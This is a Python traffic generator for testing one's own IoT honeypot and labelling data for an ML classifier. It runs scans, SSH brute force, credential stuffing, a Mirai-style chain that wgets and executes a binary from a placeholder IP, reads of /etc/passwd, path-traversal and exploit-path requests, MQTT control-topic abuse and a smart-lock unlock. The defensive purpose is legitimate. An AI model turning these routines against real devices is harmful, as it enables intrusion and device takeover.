#!/usr/bin/env python3
"""
HoneyBot-IoT — traffic generator for testing your OWN honeypot.

This is a test harness, not an attack tool. It drives each protocol handler
the way automated internet scanners do, so you can (a) confirm every honeypot
logs correctly, (b) produce labelled rows for the Module-8 ML classifier, and
(c) run a repeatable live demo. Point it ONLY at a honeypot you operate.

Every scenario is tagged with the ML class it is meant to produce:

    scan     many short connections / banner grabs        -> RECONNAISSANCE
    brute    repeated logins from the wordlist            -> BRUTE_FORCE
    stuffing one password across many usernames           -> CREDENTIAL_STUFFING
    payload  login, then a download+run command sequence  -> MALWARE_DELIVERY / MIRAI_SIGNATURE
    c2       MQTT broker misuse + control-topic messages   -> BOTNET_C2 / ICS_UNAUTHORIZED_COMMAND
    webscan  requests for common scanner paths             -> WEB_SCAN / PROTOCOL_EXPLOIT
    ics      change a sensor threshold / unlock the lock   -> ICS_UNAUTHORIZED_COMMAND
    camera   enumerate RTSP stream paths, then log in       -> RTSP_ROUTE_ENUM / VIDEO_STREAM_ACCESS
    benign   one connection, banner, disconnect            -> NORMAL

Timing, credential order and source ports are randomised with --seed so runs
are reproducible but not identical. Requires only the stdlib + paramiko.
"""

import argparse
import base64
import json
import os
import random
import socket
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

try:
    import paramiko
    paramiko.util.log_to_file(os.devnull)
except ImportError:
    paramiko = None

HERE = os.path.dirname(os.path.abspath(__file__))


def load_wordlist(path):
    pairs = []
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and ":" in line and not line.startswith("#"):
                    u, p = line.split(":", 1)
                    pairs.append((u, p))
    except FileNotFoundError:
        pairs = [("root", "root"), ("admin", "admin"), ("admin", "1234")]
    return pairs


# scanner paths that real vulnerability scanners (nikto / botnet droppers) request
SCANNER_PATHS = [
    "/", "/login", "/admin", "/config", "/system.ini", "/.env", "/.git/config",
    "/cgi-bin/", "/shell", "/HNAP1/", "/boaform/admin/formLogin", "/wp-login.php",
    "/phpmyadmin/", "/api/v1/status", "/../../../../etc/passwd", "/picsdesc.xml",
    "/cgi-bin/luci", "/actuator/health", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
]
# a benign download+execute style command chain, used to exercise the fake shell
PAYLOAD_CMDS = [
    "cd /tmp", "busybox wget http://198.51.100.23/arm -O /tmp/.a",
    "chmod 777 /tmp/.a", "./.a", "cat /proc/mounts",
]
DISCOVERY_CMDS = ["uname -a", "cat /proc/cpuinfo", "cat /proc/meminfo", "whoami", "id",
                  "ps", "ifconfig", "cat /etc/passwd", "free", "ls -la /tmp"]


def log(tag, msg):
    print(f"  [{tag}] {msg}", flush=True)


# ── SSH ─────────────────────────────────────────────────────────────────────
def ssh_connect(host, port, user, pw, commands=None, timeout=8):
    if paramiko is None:
        raise RuntimeError("paramiko not installed")
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(host, port, user, pw, allow_agent=False, look_for_keys=False,
              timeout=timeout, banner_timeout=timeout, auth_timeout=timeout)
    outputs = []
    if commands:
        for cmd in commands:
            _, out, _ = c.exec_command(cmd, timeout=timeout)
            outputs.append(out.read().decode("utf-8", "replace"))
    c.close()
    return outputs


def try_logins(host, port, creds, kind="ssh"):
    """Return (user, pw) of the first accepted login, or None."""
    for user, pw in creds:
        try:
            ssh_connect(host, port, user, pw)
            return (user, pw)
        except paramiko.AuthenticationException:
            continue
        except Exception:
            time.sleep(0.2)
    return None


# ── raw TCP banner grab (port scan) ─────────────────────────────────────────
def banner_grab(host, port, timeout=3):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        try:
            data = s.recv(128)
        except Exception:
            data = b""
        s.close()
        return data
    except Exception:
        return None


# ── HTTP ─────────────────────────────────────────────────────────────────────
def http_get(url, auth=None, timeout=6, data=None, headers=None):
    req = urllib.request.Request(url, data=data, headers=headers or {})
    if auth:
        req.add_header("Authorization", "Basic " + base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode())
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, b""
    except Exception:
        return None, b""


def http_form_login(host, port, user, pw, timeout=6):
    data = urllib.parse.urlencode({"username": user, "password": pw}).encode()
    return http_get(f"http://{host}:{port}/login", data=data,
                    headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=timeout)


# ── MQTT (minimal client, stdlib only) ───────────────────────────────────────
def _mqtt_str(s):
    b = s.encode()
    return struct.pack("!H", len(b)) + b


def _rem_len(n):
    out = bytearray()
    while True:
        d = n % 128
        n //= 128
        if n:
            d |= 0x80
        out.append(d)
        if not n:
            return bytes(out)


class MQTT:
    def __init__(self, host, port, timeout=6):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)

    def connect(self, cid="sim", user=None, pw=None):
        flags, payload = 0x02, _mqtt_str(cid)
        if user is not None:
            flags |= 0x80
            payload += _mqtt_str(user)
        if pw is not None:
            flags |= 0x40
            payload += _mqtt_str(pw)
        vh = _mqtt_str("MQTT") + bytes([0x04, flags]) + struct.pack("!H", 60)
        body = vh + payload
        self.s.sendall(bytes([0x10]) + _rem_len(len(body)) + body)
        return self.s.recv(4)

    def subscribe(self, topic, pid=1):
        body = struct.pack("!H", pid) + _mqtt_str(topic) + bytes([0x00])
        self.s.sendall(bytes([0x82]) + _rem_len(len(body)) + body)
        try:
            return self.s.recv(256)
        except Exception:
            return b""

    def publish(self, topic, payload):
        body = _mqtt_str(topic) + payload.encode()
        self.s.sendall(bytes([0x30]) + _rem_len(len(body)) + body)

    def disconnect(self):
        try:
            self.s.sendall(b"\xe0\x00")
            self.s.close()
        except Exception:
            pass


# ── RTSP (stdlib) ─────────────────────────────────────────────────────────────
def rtsp_request(host, port, method, path, cseq, extra="", timeout=5):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        req = f"{method} rtsp://{host}:{port}{path} RTSP/1.0\r\nCSeq: {cseq}\r\n{extra}\r\n"
        s.sendall(req.encode())
        resp = s.recv(2048).decode("utf-8", "replace")
        s.close()
        return resp
    except Exception:
        return ""


# ═══════════════════════════════════════════════════════════════════════════
#  Scenarios
# ═══════════════════════════════════════════════════════════════════════════
def jitter(a, b):
    time.sleep(random.uniform(a, b))


def scn_scan(cfg):
    log("scan", "port scan / banner grabs across all honeypot ports")
    ports = [cfg.ssh_port, cfg.telnet_port, cfg.http_port, cfg.mqtt_port, cfg.rtsp_port, 2222, 2323, 554]
    random.shuffle(ports)
    for p in ports:
        banner_grab(cfg.host, p)
        jitter(0.05, 0.3)


def scn_brute(cfg):
    log("brute", f"SSH brute-force ({len(cfg.creds)} creds) + Telnet + HTTP form")
    creds = cfg.creds[:]
    random.shuffle(creds)
    for user, pw in creds:
        try:
            ssh_connect(cfg.host, cfg.ssh_port, user, pw)
        except Exception:
            pass
        jitter(0.1, 0.4)
    for user, pw in random.sample(creds, min(6, len(creds))):
        http_form_login(cfg.http_host, cfg.http_port, user, pw)
        jitter(0.05, 0.2)


def scn_stuffing(cfg):
    log("stuffing", "one password across many usernames (credential stuffing)")
    pw = "123456"
    for user in ["root", "admin", "user", "test", "guest", "support", "oracle"]:
        try:
            ssh_connect(cfg.host, cfg.ssh_port, user, pw)
        except Exception:
            pass
        jitter(0.05, 0.2)


def scn_payload(cfg):
    log("payload", "login then download+run command sequence (Mirai-style)")
    hit = try_logins(cfg.host, cfg.ssh_port, cfg.creds)
    if not hit:
        log("payload", "no SSH login accepted — skipping")
        return
    # real bots send the whole chain as ONE exec string: ssh host "a; b; c"
    chain = "; ".join(["enable", "system", "shell", "sh", "/bin/busybox MIRAI"] + PAYLOAD_CMDS)
    try:
        ssh_connect(cfg.host, cfg.ssh_port, hit[0], hit[1], commands=[chain])
    except Exception as e:
        log("payload", f"ssh exec error: {e!r}")
    jitter(0.3, 0.6)


def scn_discovery(cfg):
    log("discovery", "post-login system reconnaissance commands")
    hit = try_logins(cfg.host, cfg.ssh_port, cfg.creds)
    if hit:
        try:
            ssh_connect(cfg.host, cfg.ssh_port, hit[0], hit[1],
                        commands=random.sample(DISCOVERY_CMDS, 6))
        except Exception:
            pass


def scn_c2(cfg):
    log("c2", "MQTT broker misuse: wildcard subscribe + control-topic publishes")
    try:
        m = MQTT(cfg.mqtt_host, cfg.mqtt_port)
        m.connect(cid="mirai_" + str(random.randint(1000, 9999)))
        m.subscribe("#")
        jitter(0.2, 0.5)
        for topic, msg in [("lock/cmd", "unlock"), ("sensor/config/set", '{"temp_threshold":"20"}'),
                           ("camera/cmd", "stop"), ("botnet/report", "online"),
                           ("lock/cmd", "lock")]:
            m.publish(topic, msg)
            jitter(0.1, 0.3)
        m.disconnect()
    except Exception as e:
        log("c2", f"mqtt error: {e}")


def scn_webscan(cfg):
    log("webscan", f"{len(SCANNER_PATHS)} scanner/exploit path requests")
    for path in SCANNER_PATHS:
        http_get(f"http://{cfg.http_host}:{cfg.http_port}{path}")
        jitter(0.03, 0.15)


def scn_ics(cfg):
    log("ics", "unauthorised device-control via REST + Telnet")
    # smart-lock REST: authenticate, then unlock
    status, body = http_get(f"http://{cfg.http_host}:{cfg.lock_port}/api/v1/auth",
                            data=b'{"username":"admin","password":"admin"}',
                            headers={"Content-Type": "application/json"})
    try:
        token = json.loads(body).get("token") if body else None
    except Exception:
        token = None
    if token:
        http_get(f"http://{cfg.http_host}:{cfg.lock_port}/api/v1/lock?token={token}",
                 data=b'{"action":"unlock"}', headers={"Content-Type": "application/json"})
        log("ics", "smart lock unlocked via REST API")
    # sensor threshold change over Telnet
    try:
        s = socket.create_connection((cfg.telnet_host, cfg.telnet_port), timeout=6)
        s.settimeout(6)
        time.sleep(0.4)
        s.recv(512)
        s.sendall(b"admin\r\n")
        time.sleep(0.2)
        s.recv(128)
        s.sendall(b"admin\r\n")
        time.sleep(0.4)
        s.recv(512)
        s.sendall(b"sensorctl set temp_threshold 20\r\n")
        time.sleep(0.3)
        s.sendall(b"exit\r\n")
        s.close()
        log("ics", "sensor threshold changed via Telnet")
    except Exception as e:
        log("ics", f"telnet error: {e}")


def scn_camera(cfg):
    log("camera", "RTSP stream-path enumeration + Digest login + stream open")
    auth = "Authorization: Basic " + base64.b64encode(b"admin:admin").decode() + "\r\n"
    # Cameradar-style path brute force (several non-existent routes -> RTSP_ROUTE_ENUM)
    routes = ["/cam/realmonitor", "/stream1", "/live", "/onvif1",
              "/0", "/video.h264", "/mpeg4", "/axis-media/media.amp", "/nphMotionJpeg", "/ch01"]
    for i, r in enumerate(routes):
        rtsp_request(cfg.rtsp_host, cfg.rtsp_port, "DESCRIBE", r, i + 1, auth)
        jitter(0.05, 0.2)
    # open a real stream on a valid route with default creds -> VIDEO_STREAM_ACCESS
    try:
        s = socket.create_connection((cfg.rtsp_host, cfg.rtsp_port), timeout=5)
        s.settimeout(5)
        url = f"rtsp://{cfg.rtsp_host}:{cfg.rtsp_port}/cam/realmonitor"
        def send(method, extra="", cseq=[1]):
            s.sendall(f"{method} {url} RTSP/1.0\r\nCSeq: {cseq[0]}\r\n{auth}{extra}\r\n".encode())
            cseq[0] += 1
            return s.recv(2048).decode("utf-8", "replace")
        send("DESCRIBE")
        setup = send("SETUP/trackID=0", "Transport: RTP/AVP;unicast;client_port=5000-5001\r\n")
        sess = ""
        for ln in setup.splitlines():
            if ln.lower().startswith("session:"):
                sess = ln.split(":", 1)[1].split(";")[0].strip()
        send("PLAY", f"Session: {sess}\r\n")
        send("TEARDOWN", f"Session: {sess}\r\n")
        s.close()
        log("camera", "stream opened and torn down")
    except Exception as e:
        log("camera", f"stream error: {e}")


def scn_benign(cfg):
    log("benign", "single banner grab + immediate disconnect")
    banner_grab(cfg.host, cfg.telnet_port)
    rtsp_request(cfg.rtsp_host, cfg.rtsp_port, "OPTIONS", "/", 1)


SCENARIOS = {
    "scan": scn_scan, "brute": scn_brute, "stuffing": scn_stuffing, "payload": scn_payload,
    "discovery": scn_discovery, "c2": scn_c2, "webscan": scn_webscan, "ics": scn_ics,
    "camera": scn_camera, "benign": scn_benign,
}


def main():
    ap = argparse.ArgumentParser(description="HoneyBot-IoT traffic generator (lab use only)")
    ap.add_argument("--host", default="127.0.0.1", help="SSH/scan target host")
    ap.add_argument("--http-host", dest="http_host")
    ap.add_argument("--telnet-host", dest="telnet_host")
    ap.add_argument("--mqtt-host", dest="mqtt_host")
    ap.add_argument("--rtsp-host", dest="rtsp_host")
    ap.add_argument("--ssh-port", type=int, default=2222)
    ap.add_argument("--telnet-port", type=int, default=2323)
    ap.add_argument("--http-port", type=int, default=8080)
    ap.add_argument("--lock-port", type=int, default=8081)
    ap.add_argument("--sensor-port", type=int, default=8082)
    ap.add_argument("--mqtt-port", type=int, default=1883)
    ap.add_argument("--rtsp-port", type=int, default=8554)
    ap.add_argument("--wordlist", default=os.path.join(HERE, "wordlist.txt"))
    ap.add_argument("-s", "--scenario", action="append", choices=list(SCENARIOS) + ["all"],
                    help="scenario(s) to run (default: all)")
    ap.add_argument("--rounds", type=int, default=1, help="repeat the whole set N times")
    ap.add_argument("--seed", type=int, default=None)
    ap.add_argument("--confirm-own-honeypot", action="store_true",
                    help="acknowledge the target is a honeypot you operate")
    cfg = ap.parse_args()

    for attr, default in (("http_host", "host"), ("telnet_host", "host"),
                          ("mqtt_host", "host"), ("rtsp_host", "host")):
        if getattr(cfg, attr) is None:
            setattr(cfg, attr, getattr(cfg, default))
    if cfg.seed is not None:
        random.seed(cfg.seed)
    cfg.creds = load_wordlist(cfg.wordlist)

    private = cfg.host.startswith(("127.", "10.", "192.168.", "172.")) or \
        cfg.host in ("localhost", "ssh_honeypot") or not any(c.isdigit() for c in cfg.host.split(".")[0])
    if not (private or cfg.confirm_own_honeypot):
        print("Refusing to run against a non-local host without --confirm-own-honeypot.\n"
              "Only ever point this at a honeypot you operate.", file=sys.stderr)
        sys.exit(2)
    if paramiko is None:
        print("WARNING: paramiko not installed — SSH scenarios will be skipped.", file=sys.stderr)

    chosen = cfg.scenario or ["all"]
    names = list(SCENARIOS) if "all" in chosen else chosen
    print(f"HoneyBot-IoT simulator → {cfg.host}  scenarios={names}  rounds={cfg.rounds}")
    for rnd in range(cfg.rounds):
        if cfg.rounds > 1:
            print(f"── round {rnd + 1}/{cfg.rounds} ──")
        for name in names:
            try:
                SCENARIOS[name](cfg)
            except Exception as e:
                log(name, f"error: {e}")
            jitter(0.2, 0.6)
    print("done. Check the dashboard, then: POST /api/detect to classify immediately.")


if __name__ == "__main__":
    main()
